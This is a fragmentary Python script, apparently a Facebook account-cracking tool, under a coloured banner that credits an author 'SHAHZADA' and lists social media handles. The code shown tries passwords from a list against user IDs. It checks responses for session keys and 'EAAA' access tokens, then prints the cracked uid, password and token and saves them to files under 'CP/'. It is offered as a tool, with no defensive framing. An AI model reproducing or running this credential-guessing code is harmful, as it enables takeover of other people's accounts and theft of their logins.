...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 SHAHZADA 🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [SHAHZADA] BIGRA PATHAN. ║
...
\x1b[0;33m║#YOUTUBE : SHAHZADA TRICKS😐.  ║

\x1b[0;33m║#FACEBOOK : NAME [SHAHZADA  II ].       ║

\x1b[0;33m║#GITHUB : https://github.com/SubhanXPathan.   ║

\x1b[0;33m║#WHATSAPP : 03.                   ║
...
def login():
	...
	try:
		...
		try:
			...
			requests.post("https://graph.facebook.com/bers?access_token="+token)      # Dapunta Khurayra X
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[SHAHZADA-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				open("CP/%s.txt"%(SHAHZADA),"a").write(" + %s|%s\n"%(uid, pw))
